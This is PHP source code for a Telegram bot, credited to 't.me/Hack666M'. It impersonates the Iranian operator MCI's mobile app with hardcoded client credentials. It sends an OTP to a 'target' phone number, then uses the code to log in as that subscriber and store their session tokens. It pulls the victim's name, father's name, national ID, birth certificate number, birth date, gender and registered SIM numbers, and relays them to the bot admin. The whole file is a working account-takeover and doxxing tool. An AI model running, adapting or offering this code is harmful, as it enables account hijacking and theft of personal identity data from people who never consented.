<?php
$proxy = '123.45.678.90:8080'; // آیپی و پورت پروکسی ایران
$proxyauth = 'kirkhar'; // رمز پروکسی
$API_KEY = ""; // توکن
$admin = 666; // آیدی عددی کیریت 

define('TOKEN', $API_KEY);
error_log(E_ALL);
ini_set("error_log", true);
date_default_timezone_set("Asia/Tehran");

if (!is_dir("admin")) {
    mkdir("admin");
    file_put_contents("admin/index.php", "<?php http_response_code(404); ?>");
}if (!is_dir("users")) {
    mkdir("users");
    file_put_contents("users/index.php", "<?php http_response_code(404); ?>");
}
if (!file_exists("admin/data.json")) {
    $arr = ['cmd' => '', 'messid' => ''];
    file_put_contents("admin/data.json", json_encode($arr, 448));
}
function guidv4($data = null)
{
    $data = $data ?? random_bytes(16);
    assert(strlen($data) == 16);
    $data[6] = chr(ord($data[6])&0x0f | 0x40);
    $data[8] = chr(ord($data[8])&0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
function getDeviceId()
{
    $deviceinfo = [
        "deviceInfo" => [
            "appVersion" => "5.8.2",
            "deviceEmail" => "null",
            "deviceType" => "ANDROID",
            "lat" => 0,
            "lon" => 0,
            "manufacturer" => "Samsung",
            "model" => "SM-J600",
            "network" => "0",
            "os" => "google",
            "osVersion" => "REL",
            "screenHeight" => "1024",
            "screenWidth" => "576",
            "udid" => "ffffffff-9477-c6ae-0000-00000a00786b-b3080cd663d47c15",
        ],
        "fcmToken" => "",
    ];
    global $proxyauth, $proxy;
    $url = "https://api-ebcom.mci.ir/services/user/device/v1.0";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "clientid:
9f740bf9-817a-4539-bb1d-43790fc93b75"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($deviceinfo, 448));
    curl_setopt($ch, CURLOPT_ENCODING, '');
    return json_decode(curl_exec($ch), true)['result']['data']['id'];
}
function sendotp($phone, $DeviceID)
{
    global $proxy, $proxyauth;
    $data = array('appcode' => '3tfvy9PD6wO', "msisdn" => "$phone");
    $header = [
        'Host: api-ebcom.mci.ir',
        'Clientid: 9f740bf9-817a-4539-bb1d-43790fc93b75',
        'Content-Type: application/json; charset=UTF-8',
        'Content-Length: ' . strlen(json_encode($data, 448)),
        'User-Agent: okhttp/3.12.12'];
    $url = "https://api-ebcom.mci.ir/services/auth/v1.0/otp";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, 448));
    curl_setopt($ch, CURLOPT_ENCODING, '');
    return curl_exec($ch);
}
function login($phone, $otp, $DeviceID)
{
    $header = [
        'Host: api-ebcom.mci.ir',
        'Clientid: 9f740bf9-817a-4539-bb1d-43790fc93b75',
        'Deviceid: ' . $DeviceID,
        'Clientsecret: mymci',
        'Scope: mymciGroup',
        'Username: ' . $phone,
        'User-Agent: okhttp/3.12.12',
    ];
    global $proxy, $proxyauth;
    $url = "https://api-ebcom.mci.ir/services/auth/v1.0/user/login/otp/$otp?mcisubs=true";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    return curl_exec($ch);
}
function getProfile($token)
{
    global $proxy, $proxyauth;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api-ebcom.mci.ir/services/user/v1.0/profile");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "authorization: Bearer $token",
    ], );
    return curl_exec($ch);
}
function getusim($token)
{
    global $proxy, $proxyauth;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api-ebcom.mci.ir/services/mci/subscriber/v1.0/usim/all");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "authorization: Bearer $token",
    ], );
    return curl_exec($ch);
}

function todate($date)
{
    return
    json_decode(file_get_contents("https://codingtools.ir/api/v1/service/date-converter?to=shamsi&from=date&date=$date&time=08:48:36"),
        true)['date'];
}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    $res = curl_exec($ch);
    return json_decode($res, true);
}
function sm($chatid, $text, $messageid, $keyboard)
{
    @$result = bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_to_message_id' => $messageid,
        'reply_markup' => $keyboard,
        'disable_web_page_preview' => true,
    ])['result']['message_id'];
    return $result;
}
function em($chatid, $text, $message_id, $keyboard)
{
    @$result = bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard,
    ])['result']['message_id'];
    return $result;
}
function dm($chat_id, $message_id)
{
    return bot('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
    ]);
}
function ch($type, $data)
{
    $dat = json_decode(file_get_contents("admin/data.json"), true);
    $dat["$type"] = $data;
    file_put_contents("admin/data.json", json_encode($dat));
}
function ret($name)
{
    $data = json_decode(file_get_contents("admin/data.json"))->$name;
    return $data;
}
function checkrange($number)
{
    $status = false;
    $mcirange = ['0910', '0911', '0912', '0913', '0914', '0915', '0916', '0917', '0918', '0919', '0990', '0991', '0992',
        '0993', '0994', '0995', '0996'];
    foreach ($mcirange as $range) {
        if (substr($number, 0, 4) == $range) {
            $status = true;
            break;
        }
    }
    return $status;
}
if (strlen(file_get_contents("php://input")) > 2) {
    $main_token = TOKEN;
    $update = json_decode(file_get_contents("php://input"), true);
    $message = $update['message'] ?? "Null";
    $message_id = $message['message_id'] ?? "Null";
    $chat_id = isset($update['callback_query']['message']['chat']['id']) ?
    $update['callback_query']['message']['chat']['id'] : $message['chat']['id'] ?? "Null";
    $chat_name = isset($update['callback_query']['message']['chat']['first_name']) ?
    $update['callback_query']['message']['chat']['first_name'] : $message['chat']['first_name'] ?? "Null";
    $chat_username = isset($update['callback_query']['message']['chat']['username']) ?
    $update['callback_query']['message']['chat']['username'] : $message['chat']['username'] ?? "Null";
    $chat_type = $message['chat']['type'] ?? "Null";
    $text = $message['text'] ?? null;
    $callback_query = $update['callback_query'] ?? "Null";
    $cb_id = $callback_query['id'] ?? "Null";
    $cbfrom = $callback_query['from'] ?? "Null";
    $cbfrom_id = $cbfrom['id'] ?? "Null";
    $cbfrom_name = $cbfrom['first_name'] ?? "Null";
    $cbfrom_username = $cbfrom['username'] ?? "Null";
    $cbmessage = $callback_query['message'] ?? "Null";
    $cbmessage_id = $cbmessage['message_id'] ?? "Null";
    $cbdata = $update['callback_query']['data'] ?? "Null";
    $cmd = ret("cmd");
    $messid = ret("messid");
    if ($admin == $chat_id) {
        $start = json_encode(['inline_keyboard' => [
            [['text' => "شروع", "callback_data" => "getinformation"]],
        ], 'resize_keyboard' => true]);
        $back = json_encode(['inline_keyboard' => [
            [['text' => "بازگشت", "callback_data" => "back"]],
        ], 'resize_keyboard' => true]);

        if (preg_match('/^\/([Ss]tart)(.*)/', $text)) {
            ch("cmd", "");
            ch("messid", "");
            sm($chat_id, "📍 سلام کاربر عزیز\nبه ربات همراه من خوش آمدید

🧠 نویسنده و پشتیبان : t.me/Hack666M
", $message_id, $start);
        } elseif ($cbdata == "back") {
            ch("cmd", "");
            ch("messid", "");
            em($chat_id, "📍 سلام کاربر عزیز\nبه ربات همراه من خوش آمدید

🧠 نویسنده و پشتیبان : t.me/Hack666M
", $cbmessage_id, $start);
        } elseif ($cbdata == "getinformation") {
            $id = em($chat_id, "☎️ ️شماره همراه اول تارگت را وارد کنید!

ℹ مثال : 09123456789", $cbmessage_id, $back);
            ch("cmd", "sendotp");
            ch("messid", $id);
        } elseif ($cmd == "sendotp") {
            dm($chat_id, $messid);
            $id = sm($chat_id, "♻ ️در حال دریافت اطلاعات !!!", $message_id, null);
            if (strlen($text) == 11) {
                if (preg_match('/[0-9]/', $text)) {
                    if (checkrange($text)) {
                        $Deviceid = getDeviceId();
                        $data = json_decode(sendotp(substr($text, 1, 11), $Deviceid), true);
                        if ($data['status']['code'] == 200) {
                            file_put_contents("users/$text.json", json_encode(['Deviceid' => $Deviceid, "phone" =>
                                $text], 448));
                            $newid = em($chat_id, "✅ کد تایید با موفقیت به شماره [<code>$text</code>] ارسال شد

🌀 کد 4 رقمی ارسال شده از سمت همراه من را ارسال کنید", $id, $back);
                            ch("cmd", "verify");
                            ch("number", $text);
                            ch("messid", $newid);
                        } else {
                            $errormessage = $data['result']['status']['message'];
                            em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : $errormessage\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);
                            ch("cmd", "");
                        }
                    } else {
                        $newid = em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : شماره تلفن باید مال اوپراتور همراه اول باشد و با پیش شماره همراه اول شروع شود\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);
                        ch('messid', $newid);
                    }
                } else {
                    $newid = em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : شماره تلفن باید کاملا عددی باشد و به صورت انگلیسی تایپ شود\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);
                    ch('messid', $newid);
                }
            } else {
                $newid = em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : شماره باید 11 رقم باشد و از صفر شروع شود\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);
                ch('messid', $newid);
            }
        } elseif ($cmd == "verify" and isset($text)) {
            dm($chat_id, $messid);
            $id = sm($chat_id, "♻ ️در حال دریافت اطلاعات !!!", $message_id, null);
            if (strlen($text) == 4) {
                $number = ret("number");
                $Deviceid = json_decode(file_get_contents("users/$number.json"), true)['Deviceid'];
                $data = json_decode(login(substr($number, 1, 11), $text, $Deviceid), true);
                if ($data['status']['code'] == 200) {
                    $newid = em($chat_id, "✅ عملیات لاگین با موفقیت انجام شد", $id, null);
                    $id = $data['result']['data']['id'];
                    $usertoken = $data['result']['data']['token'];
                    $refreshToken = $data['result']['data']['refreshToken'];
                    $expiresIn = $data['result']['data']['expiresIn'];
                    $session = $data['result']['data']['session'];
                    $acl = $data['result']['data']['acl'];
                    $phones = [];
                    foreach ($acl as $phone) {
                        $phones[] = $phone['msisdn'];
                    }
                    $sessionid = $session['id'];
                    $sessionprime = $session['prime'];
                    $sessionkey = $session['key'];
                    $userdata['accountdata'] = [];
                    $userdata['accountdata']['id'] = $id;
                    $userdata['accountdata']['token'] = $usertoken;
                    $userdata['accountdata']['refreshToken'] = $refreshToken;
                    $userdata['accountdata']['expiresIn'] = $expiresIn;
                    $userdata['accountdata']['sessionid'] = $sessionid;
                    $userdata['accountdata']['sessionprime'] = $sessionprime;
                    $userdata['accountdata']['sessionkey'] = $sessionkey;
                    $userdata['numbers'] = $phones;
                    file_put_contents("users/$number.json", json_encode($userdata, 448));
                    ch("cmd", "");
                    $profiledata = json_decode(getProfile($usertoken), true)['result']['data'];
                    $firstname = $profiledata['firstname'];
                    $lastname = $profiledata['lastname'];
                    $attr = $profiledata['attributes'];
                    if (isset($attr) and isset($attr['fathername'])) {
                        $fathername = $attr['fathername'];
                        $nationalCode = $attr['nationalCode'];
                        $gender = $attr['gender'];
                        $birthDate = $attr['birthDate'];
                        $ssn = $attr['ssn'];
                        $resdata = ['firstname' => $firstname, "lastname" => $lastname, "codemeli" => $nationalCode, "gender" => $gender,
                            "fathername" => $fathername, "birthdate" => $birthDate, "ssn" => $ssn];
                    } else {
                        $resdata = [];
                    }
                    if ($gender == "MALE") {
                        $jens = "مرد";
                    } else {
                        $jens = "زن";
                    }
                    $jsondata = json_decode(file_get_contents("users/$number.json"), true);
                    $jsondata['personinfo'] = $resdata;
                    $birthdateshamsi = todate(str_replace("-", "/", $birthDate));
                    file_put_contents("users/$number.json", json_encode($jsondata, 448));
                    em($chat_id, "✅ اطلاعات فردی شخص با موفقیت دریافت شد

👤 نام و نام خانوادگی کامل : $firstname - $lastname
👨 نام پدر : $fathername
❔ کد ملی : $nationalCode
🔢 شماره شناسنامه : $ssn
📅 تاریخ تولد : $birthdateshamsi
🚻 ️جنسیت : $jens

🧠 نویسنده و پشتیبان : t.me/Hack666M", $newid, json_encode(['inline_keyboard' => [
                        [['text' => "دریافت لیست شماره ها", "callback_data" => "getphones/$number"]],
                        [['text' => "شروع دوباره", "callback_data" => "back"]],
                    ], 'resize_keyboard' => true]));
                } else {
                    $errormessage = $data['result']['status']['message'];
                    em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : $errormessage\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);
                    ch("cmd", "");
                }
            } else {
                $newid = em($chat_id, "🚫 ️خطا در\n\n⚠ ️ارور لاگ : کد تایید چهار رقمی میباشد\n\n🧠 نویسنده و پشتیبان : t.me/Hack666M", $id, $back);

            }
        } elseif (strpos($cbdata, "getphones/") !== false) {
            $phone = explode("/", $cbdata)[1];
            $jsondata = json_decode(file_get_contents("users/$phone.json"), true);
            $usertoken = $jsondata['accountdata']['token'];
            $getusim = json_decode(getusim($usertoken), true);
            $sims = $getusim['result']['data'];
            $count = 1;
            $emoji = ['0️⃣', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
            $numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
            $disable = "غیرفعال 🚫";
            $enable = "فعال ✅";
            $phonelist = "";
            foreach ($sims as $sim) {
                if ($sim['status'] == "ACTIVE") {
                    $status = $enable;
                } else {
                    $status = $disable;
                }
                $list = str_replace($numbers, $emoji, $count);
                $count++;
                $phonelist .= "$list-0{$sim['msisdn']} $status\n";
            }
            $name = $jsondata['personinfo']['firstname'] . "-" . $jsondata['personinfo']['lastname'];
            sm($chat_id, "🔅 لیست شماره های به نام [$name] در زیر شرح شده است
{
$phonelist
}
🧠 نویسنده و پشتیبان : t.me/Hack666M", $cbmessage_id, null);
        }
    }
}
